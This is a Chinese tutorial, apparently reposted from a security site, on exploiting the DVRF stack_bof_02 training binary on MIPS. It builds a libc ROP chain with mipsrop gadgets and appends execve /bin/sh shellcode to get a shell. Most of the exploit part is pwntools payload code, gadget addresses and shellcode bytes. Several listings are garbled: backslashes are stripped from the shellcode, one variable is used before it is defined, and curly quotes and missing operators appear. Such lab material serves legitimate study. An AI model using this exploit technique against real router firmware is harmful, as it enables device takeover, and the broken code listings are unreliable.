> 原文链接: https://www.anquanke.com//post/id/172126 


# 路由器漏洞挖掘之栈溢出入门（三）ROP链的构造


                                阅读量   
                                **212264**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/dm/1024_501_/t01017cb10a6f512436.jpg)](https://p3.ssl.qhimg.com/dm/1024_501_/t01017cb10a6f512436.jpg)



## 前言

DVRF 的第二个栈溢出程序是 stack_bof_2，这题和上一道题的差异就在于这道题没有给我们后门函数，**需要自己构造 shellcode 来进行调用。**

[![](https://i.imgur.com/t18e6au.png)](https://i.imgur.com/t18e6au.png)

README 文件里也做了说明，所以这里的重点**是 ROP 链的构造以及 sleep(1) 的用法。**



## 确定偏移

和上一道题一样，首先我们需要确定 ra 的偏移。

使用 patternLocOffset.py 生成 500 个长度的 pattern（或者使用 pwntools 里的自带的工具 cyclic），并开启 gdb 调试端口

```
nick@nick-machine:~/iot/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root$ python ../../../../tools/patternLocOffset.py -c -l 500 -f ./pattern
[*] Create pattern string contains 500 characters ok!
[+] output to ./pattern ok!
[+] take time: 0.0106 s

nick@nick-machine:~/iot/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root$ ./qemu-mipsel -g 23946 -L ./ ./pwnable/ShellCode_Required/stack_bof_02 "`cat ./pattern`"
```

在 0x400928 处下断点，得到此时 ra 寄存器的值是 0x72413971

[![](https://i.imgur.com/tCPI79J.png)](https://i.imgur.com/tCPI79J.png)

```
python ../../../../tools/patternLocOffset.py  -s 0x72413971 -l 500
```

[![](https://i.imgur.com/odrLdcl.png)](https://i.imgur.com/odrLdcl.png)

这里得到偏移是 508 个字节。



## ROP 构造详解

这里溢出到 $ra 寄存器需要 508 个字节，后面的四个字节就是需要构造的 ROP 的地址。

### <a class="reference-link" name="%E8%B0%83%E7%94%A8%20sleep(1)%20%E5%87%BD%E6%95%B0"></a>调用 sleep(1) 函数

之所以要调用 sleep 函数的原因，

调用 sleep 函数的前提是先布置好他的参数 $a0 = 1。

所以这里我们先在 libc 中搜索一下将参数 1 赋值给 $a0 寄存器的 `gadget： "li $a0,1"`

[![](https://i.imgur.com/obpBD9q.png)](https://i.imgur.com/obpBD9q.png)

gadget 的末尾是：

```
jr $s1
```

所以在原来覆盖栈数据时候就要求我们能够**覆盖 $s1 寄存器**，以达到跳转到下一个 gadget 的目的。

但是在 main 函数的汇编语句的末尾，没有找到类似 `lw $s0,0x123($sp)` 这样的汇编语句，所以我们无法控制 $s1 寄存器

[![](https://i.imgur.com/ojELtb1.png)](https://i.imgur.com/ojELtb1.png)

所以这里我们需要先找到一个**将栈上的数据传递给 $s1 寄存器的 gadget**

这里使用 `mipsrop.tail()` 来搜索 gadget

[![](https://i.imgur.com/Si1xYxd.png)](https://i.imgur.com/Si1xYxd.png)

找到的都不太能够满足我们的要求，这里根据下面这篇文章，找到一个特别不错的 gadget。**也就是上图中 `scandir` 函数的结尾的部分**

[https://xz.aliyun.com/t/1511](https://xz.aliyun.com/t/1511)

跳转到 0xAFE0 之后，我们就可以继续在原来的栈上布置下一步的 `gadget` 了。
- 在此之前我们还需要和上一篇的方法一样，在 gdb 调试中找到 libc 的基地址。（vmmap 或者 i proc mappings）
使用 `pwntools` 工具生成填充文件

```
from pwn import *

libc_addr = 0x766e5000
payload = 'a' * 508
payload += p32(libc_addr + 0x0000Afe0)

with open('stack2_fill','wb') as f:
        f.write(payload)

print("OKn")
```

开启 gdb 调试：

```
./qemu-mipsel -g 23946 -L ./ ./pwnable/ShellCode_Required/stack_bof_02 "`cat ./stack2_fill`"
```

还是断在 `0x400928` 处

[![](https://i.imgur.com/5SpERdM.png)](https://i.imgur.com/5SpERdM.png)

单步，可见我们需要布置的下一个 gadget 的位置在 `$sp+0x3c` （ra 寄存器位置）

[![](https://i.imgur.com/5a8ZNGX.png)](https://i.imgur.com/5a8ZNGX.png)

根据调试，我们需要在原来的 `payload` 后面 padding `0x3c` 个字节才能控制 ra 寄存器

```
libc_addr = 0x766e5000
payload = 'a' * 508
payload += p32(libc_addr + 0x0000Afe0)  # jr $ra
payload += 'b' * 0x3c        # padding
payload += 'c' * 4           # ra
```

在这填充的 0x3c 个字节中，我们对于 s0 – fp 寄存器的值都是可控的，那么接下来就好办了。在这 0x3c 个字节中，**拆分填充成这几个寄存器的值**就行了。

我们还是采用上面那个 `0x0002FB10` 地址的 `gadget` ，ra 设置为这个地址，那么这里的 s1 寄存器的值就需要填充为下一个 `gadget` 的地址
<li>
**这里不能直接填充为 sleep 函数的地址**，因为我们这里没办法控制 ra 寄存器。如果直接调用 sleep 函数的话就没办法返回了。所以需要找到一个既可以调用 sleep 函数又可以控制 ra 寄存器的 **gadget**
</li>
```
mipsrop.find("move $t9,$s3")
```

找到 `0x00021C34` 这个地址的 `gadget`

[![](https://i.imgur.com/LsuYBVH.png)](https://i.imgur.com/LsuYBVH.png)

这里的 s3 寄存器就填充为 sleep 函数地址，调用完成之后继续返回到这个 gadget 的 `jr $ra`。

这里的 ra 寄存器的值就填充为下一个 `gadget` 的地址

这时的 `payload`：

```
from pwn import *

context.endian = 'little'
context.arch = 'mips'

libc_addr = 0x766e5000
sleep_offset = 0x0002F2B0

payload = 'a' * 508
payload += p32(libc_addr + 0xAfe0)      # jr $ra

payload += 'b' * (0x3c - 4 * 9)

payload += 'a' * 4                       # s0
payload += p32(libc_addr + 0x21C34)      # s1
payload += 'a' * 4                       # s2
payload += p32(libc_addr + sleep_offset) # s3
payload += 'a' * 4                       # s4
payload += 'a' * 4                       # s5
payload += 'a' * 4                       # s6
payload += 'a' * 4                       # s7
payload += 'a' * 4                       # fp
payload += p32(libc_addr + 0x2FB10)      # ra

#---------------stack 2 (0x21C34)-------------------

payload += 'c' * 0x2c
payload += p32(next_gadget_addr)
```

### <a class="reference-link" name="%E8%B0%83%E7%94%A8%20shellcode"></a>调用 shellcode

继续下一步的 `gadget` 的调用，我们这次使用 `mipsrop.stackfinder()` 找到 `0x000171CC` 这一处的 `gadget`。

[![](https://i.imgur.com/uzHE421.png)](https://i.imgur.com/uzHE421.png)

这里的 $a0 寄存器是从栈上来取值，**我们就可以向 $a0 对应的位置填充我们的 shellcode。**这里的 $s3 就需要在前一步的 gadget 中实现填充为类似 `jr $a0` 的 gadget

再次进行搜索，找到一处：

```
Python&gt;mipsrop.find("move $t9, $a0")
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000214A0  |  move $t9,$a0                                        |  jalr  $a0                             |
----------------------------------------------------------------------------------------------------------------
```

正好可以满足我们的条件。

[![](https://i.imgur.com/xjOPR7a.png)](https://i.imgur.com/xjOPR7a.png)

因此在第二个栈的 `payload` 为：

```
payload += 'c' * 0x24

payload += p32(libc_addr + 0x000214A0)                  # s3
payload += 'd' * 4                                      # s4

payload += p32(libc_addr + 0x171CC)                     # ra
#payload += p32(libc_addr + 0x000214A0)                  # s3
#payload += 'd' * 4

payload += 'd' * 0x18                                   # shellcode

payload += shellcode
```
<li>
**在 MIPS 指令集中，0x20 和 0x00 都是坏字节**。因此要注意 gadget 的地址不能包含这两个值</li>
在[这里](http://shell-storm.org/shellcode/files/shellcode-792.php)找到可用的 shellcode，往栈上填充就行了。

```
shellcode += "xffxffx06x28"  # slti $a2, $zero, -1
shellcode += "x62x69x0fx3c"  # lui $t7, 0x6962
shellcode += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
shellcode += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
shellcode += "x73x68x0ex3c"  # lui $t6, 0x6873
shellcode += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
shellcode += "xf8xffxaexaf"  # sw $t6, -8($sp)
shellcode += "xfcxffxa0xaf"  # sw $zero, -4($sp)
shellcode += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
shellcode += "xffxffx05x28"  # slti $a1, $zero, -1
shellcode += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
shellcode += "x0cx01x01x01"  # syscall 0x40404
```

在 gdb 中调试的效果是：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://i.imgur.com/7qvdfVF.png)

所以最后的 exp：

```
from pwn import *

context.endian = 'little'
context.arch = 'mips'

payload += "xffxffx06x28"  # slti $a2, $zero, -1
payload += "x62x69x0fx3c"  # lui $t7, 0x6962
payload += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
payload += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
payload += "x73x68x0ex3c"  # lui $t6, 0x6873
payload += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
payload += "xf8xffxaexaf"  # sw $t6, -8($sp)
payload += "xfcxffxa0xaf"  # sw $zero, -4($sp)
payload += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
payload += "xffxffx05x28"  # slti $a1, $zero, -1
payload += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
payload += "x0cx01x01x01"  # syscall 0x40404
shellcode = payload


libc_addr = 0x766e5000
sleep_offset = 0x0002F2B0

payload = 'a' * 508
payload += p32(libc_addr + 0xAfe0)      # jr $ra

payload += 'b' * (0x3c - 4 * 9)

payload += 'a' * 4                       # s0
payload += p32(libc_addr + 0x21C34)      # s1
payload += 'a' * 4                       # s2
payload += p32(libc_addr + sleep_offset) # s3
payload += 'a' * 4                       # s4
payload += 'a' * 4                       # s5
payload += 'a' * 4                       # s6
payload += 'a' * 4                       # s7
payload += 'a' * 4                       # fp
payload += p32(libc_addr + 0x2FB10)      # ra

#---------------stack 2 (0x21C34)-------------------

payload += 'c' * 0x24

payload += p32(libc_addr + 0x000214A0)                  # s3
payload += 'd' * 4                                      # s4

payload += p32(libc_addr + 0x171CC)                     # ra
#payload += p32(libc_addr + 0x000214A0)                  # s3
#payload += 'd' * 4

payload += 'f' * 0x18                                   # shellcode

payload += shellcode

with open('stack2_fill','wb') as f:
        f.write(payload)
```

重新加载一下程序就可以 **getshell**

```
./qemu-mipsel -L ./ ./pwnable/ShellCode_Required/stack_bof_02 "`cat ./stack2_fill`"
```

[![](https://i.imgur.com/2yYQlCA.png)](https://i.imgur.com/2yYQlCA.png)

**如果上面的 exp 用不了的话，也可以试试这个：**

```
from pwn import *

context.endian = ‘little’
context.arch = ‘mips’

libc_addr = 0x766e5000
sleep_offset = 0x0002F2B0

sleep_end_addr = 0x767144c8

shellcode = “”

shellcode += “xffxffx06x28” # slti $a2, $zero, -1
shellcode += “x62x69x0fx3c” # lui $t7, 0x6962
shellcode += “x2fx2fxefx35” # ori $t7, $t7, 0x2f2f
shellcode += “xf4xffxafxaf” # sw $t7, -0xc($sp)
shellcode += “x73x68x0ex3c” # lui $t6, 0x6873
shellcode += “x6ex2fxcex35” # ori $t6, $t6, 0x2f6e
shellcode += “xf8xffxaexaf” # sw $t6, -8($sp)
shellcode += “xfcxffxa0xaf” # sw $zero, -4($sp)
shellcode += “xf4xffxa4x27” # addiu $a0, $sp, -0xc
shellcode += “xffxffx05x28” # slti $a1, $zero, -1
shellcode += “xabx0fx02x24” # addiu;$v0, $zero, 0xfab
shellcode += “x0cx01x01x01” # syscall 0x40404

payload = ‘a’ * 508
payload += p32(libc_addr + 0xAfe0) # jr $ra

payload += ‘b’ (0x3c - 4 9)
payload += ‘a’ 4 # s0
payload += p32(libc_addr + 0x21C34) # s1
payload += ‘a’ 4 # s2
payload += p32(libc_addr + sleep_offset) # s3
payload += ‘a’ 4 # s4
payload += ‘a’ 4 # s5
payload += ‘a’ 4 # s6
payload += ‘a’ 4 # s7
payload += ‘a’ * 4 # fp
payload += p32(libc_addr + 0x2FB10) # ra

———————-stack 2—————————-
payload += ‘c’ 0x24
payload += p32(libc_addr + 0x000214A0) # s3
payload += ‘d’ 4 # s4
payload += p32(libc_addr + 0xAfe0) # ra

———————-stack 3—————————-
payload += ‘a’ (0x3c-49)
payload += p32(libc_addr + 0x000214A0) # s0
payload += ‘a’ 4 # s1
payload += ‘a’ 4 # s2
payload += ‘a’ 4 # s3
payload += ‘a’ 4 # s4
payload += ‘a’ 4 # s5
payload += ‘a’ 4 # s6
payload += ‘a’ 4 # s7
payload += ‘a’ 4 # fp
payload += p32(libc_addr + 0x0001B230) # ra

payload += ‘f’ * 0x28
payload += shellcode

with open(‘stack2_fill’,’wb’) as f:
f.write(payload)

print(“OKn”)
```



## 总结

个人认为构造 `gadget` 的要点是要思路要清晰，对栈的布局要有一个清楚的了解。还有就是需要熟悉 mipsrop 工具的使用。多动手调试，多踩坑才会长经验。



## 参考文章

[https://xz.aliyun.com/t/1511](https://xz.aliyun.com/t/1511)<br>[http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/](http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/)
